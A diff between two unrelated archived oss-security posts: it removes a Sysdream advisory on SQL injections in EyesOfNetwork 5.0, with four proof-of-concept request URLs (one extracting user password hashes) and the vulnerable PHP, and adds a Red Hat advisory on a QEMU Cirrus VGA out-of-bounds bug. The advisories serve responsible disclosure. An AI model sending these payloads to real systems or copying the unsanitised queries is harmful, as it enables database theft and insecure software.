@@ -1,192 +1,32 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/03/23/4
-Message-ID: <d5e3d015-3da6-e8ad-c4a2-0f741c4b3467@sysdream.com>
-Date: Thu, 23 Mar 2017 16:21:15 +0100
-From: Sydream Labs <labs@...dream.com>
-To: oss-security@...ts.openwall.com
-Subject: [CVE-2017-6088] EON 5.0 Multiple SQL Injection
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/02/21/1
+Message-ID: <alpine.LFD.2.20.1702211647360.13950@wniryva>
+Date: Tue, 21 Feb 2017 17:30:02 +0530 (IST)
+From: P J P <ppandit@...hat.com>
+To: oss security list <oss-security@...ts.openwall.com>
+cc: Stefano Stabellini <sstabellini@...nel.org>, Gerd Hoffmann <ghoffman@...hat.com>
+Subject: CVE-2017-2620 Qemu: display: cirrus: out-of-bounds access issue while in cirrus_bitblt_cputovideo
 Content-Type: text/plain; charset=utf-8
 
-# [CVE-2017-6088] EON 5.0 Multiple SQL Injection
+   Hello,
 
-## Description
+Quick emulator(Qemu) built with the Cirrus CLGD 54xx VGA Emulator support is 
+vulnerable to an out-of-bounds access issue. It could occur while copying VGA 
+data in cirrus_bitblt_cputovideo.
 
-EyesOfNetwork ("EON") is an OpenSource network monitoring solution.
+A privileged user inside guest could use this flaw to crash the Qemu process 
+resulting in DoS OR potentially execute arbitrary code on the host with 
+privileges of Qemu process on the host.
 
-## SQL injection (authenticated)
+Reference:
+----------
+   -> https://bugzilla.redhat.com/show_bug.cgi?id=1420460
 
-The Eonweb code does not correctly filter arguments, allowing
-authenticated users to inject arbitrary SQL requests.
+* 'CVE-2017-2620' has been assigned to this issue by Red Hat Inc.
+* Attached herein is a proposed patch to fix this issue.
 
-**CVE ID**: CVE-2017-6088
-
-**Access Vector**: remote
-
-**Security Risk**: medium
-
-**Vulnerability**: CWE-89
-
-**CVSS Base Score**: 6.0
-
-**CVSS Vector String**: CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:L/A:L
-
-### Proof of Concept 1 (root privileges)
-
-The following HTTP request allows an attacker (connected as
-administrator) to dump the database contents using SQL injections inside
-either the `bp_name` or the `display` parameter. These requests are
-executed with MySQL root privileges.
-
-```
-https://eonweb.local/module/admin_bp/php/function_bp.php?action=list_process&bp_name=&display=%27or%271%27=%271
-
-https://eonweb.local/module/admin_bp/php/function_bp.php?action=list_process&bp_name=%27or%271%27=%271&display=1
-```
-
-#### Vulnerable code
-
-The vulnerable code can be found inside the
-`module/monitoring_ged/ged_functions.php` file, line 114:
-
-```
-function list_process($bp,$display,$bdd){
-    $sql = "select name from bp where is_define = 1 and name!='".$bp."'
-and priority = '" . $display . "'";
-    $req = $bdd->query($sql);
-    $process = $req->fetchall();
-
-    echo json_encode($process);
-}
-```
-
-### Proof of Concept 2
-
-The following HTTP request allows an attacker to dump the database
-contents using SQL injections inside the `type` parameter:
-
-```
-https://eonweb.local/module/monitoring_ged/ajax.php?queue=active&type=1%27+AND+(SELECT+sleep(5))+AND+%271%27=%271&owner=&filter=equipment&search=&ok=on&warning=on&critical=on&unknown=on&daterange=&time_period=&ack_time=
-```
-
-#### Vulnerable code
-
-The vulnerable code can be found inside the
-`module/monitoring_ged/ajax.php` file, line 64:
-
-```
-if($_GET["type"] == 0){
-  $ged_where = "WHERE pkt_type_id!='0'";
-} else {
-  $ged_where = "WHERE pkt_type_id='".$_GET["type"]."'";
-}
-$gedsql_result1=sqlrequest($database_ged,"SELECT
-pkt_type_id,pkt_type_name FROM pkt_type $ged_where AND pkt_type_id<'100';");
-```
-
-### Proof of Concept 3
-
-The following HTTP request allows an attacker to dump the database
-contents using SQL injections inside the `search` parameter:
-
-```
-https://eonweb.local/module/monitoring_ged/ajax.php?queue=active&type=1&owner=&filter=equipment&search='+AND+(select+sleep(5))+AND+'1'='1&ok=on&warning=on&critical=on&unknown=on&daterange=&time_period=&ack_time=
-```
-
-
-#### Vulnerable code
-
-The vulnerable code can be found inside the
-`module/monitoring_ged/ged_functions.php` file, line 129.
-
-```
-if($search != ""){
-    $like = "";
-    if( substr($search, 0, 1) === '*' ){
-        $like .= "%";
-    }
-    $like .= trim($search, '*');
-    if ( substr($search, -1) === '*' ) {
-        $like .= "%";
-    }
-
-    $where_clause .= " AND $filter LIKE '$like'";
-}
-```
-
-
-### Proof of Concept 4
-
-The following HTTP request allows an attacker to dump the database
-contents using SQL injections inside the `equipment` parameter:
-
-```
-https://eonweb.local/module/monitoring_ged/ged_actions.php?action=advancedFilterSearch&filter=(select+user_passwd+from+eonweb.users+limit
-1)&queue=history
-```
-
-
-#### Vulnerable code
-
-The vulnerable code can be found inside the
-`module/monitoring_ged/ged_functions.php` file, line 493:
-
-```
-$gedsql_result1=sqlrequest($database_ged,"SELECT
-pkt_type_id,pkt_type_name FROM pkt_type WHERE pkt_type_id!='0' AND
-pkt_type_id<'100';");
-
-
-while($ged_type = mysqli_fetch_assoc($gedsql_result1)){
-    $sql = "SELECT DISTINCT $filter FROM
-".$ged_type["pkt_type_name"]."_queue_".$queue;
-
-    $results = sqlrequest($database_ged, $sql);
-    while($result = mysqli_fetch_array($results)){
-        if( !in_array($result[$filter], $datas) && $result[$filter] != "" ){
-            array_push($datas, $result[$filter]);
-        }
-    }
-}
-```
-
-
-## Timeline (dd/mm/yyyy)
-
-* 01/10/2016 : Initial discovery.
-* 09/10/2016 : Fisrt contact with vendor.
-* 23/10/2016 : Technical details sent to the security contact.
-* 27/10/2016 : Vendor akwnoledgement and first patching attempt.
-* 16/02/2017 : New tests done on release candidate 5.1. Fix confirmed.
-* 26/02/2017 : 5.1 release. Waiting for 2 weeks according to our
-repsonsible disclosure agreement.
-* 14/03/2017 : Public disclosure.
-
-Thank you to EON for the fast response.
-
-## Solution
-
-Update to version 5.1.
-
-## Affected versions
-
-* Version <= 5.0
-
-## Credits
-
-* Nicolas SERRA <n.serra@...dream.com>
-
--- 
-SYSDREAM Labs <labs@...dream.com>
-
-GPG :
-47D1 E124 C43E F992 2A2E
-1551 8EB4 8CD9 D5B2 59A1
-
-* Website: https://sysdream.com/
-* Twitter: @sysdream
-
-
-
-
-
-Download attachment "signature.asc" of type "application/pgp-signature" (848 bytes)
+Thank you.
+--
+Prasad J Pandit / Red Hat Product Security Team
+47AF CE69 3A90 54AA 9045 1053 DD13 3D32 FE5B 041F
+View attachment "cirrus-add-blit-is-unsafe-to-cirrus-bitblt-cputovideo.patch" of type "text/plain" (1936 bytes)
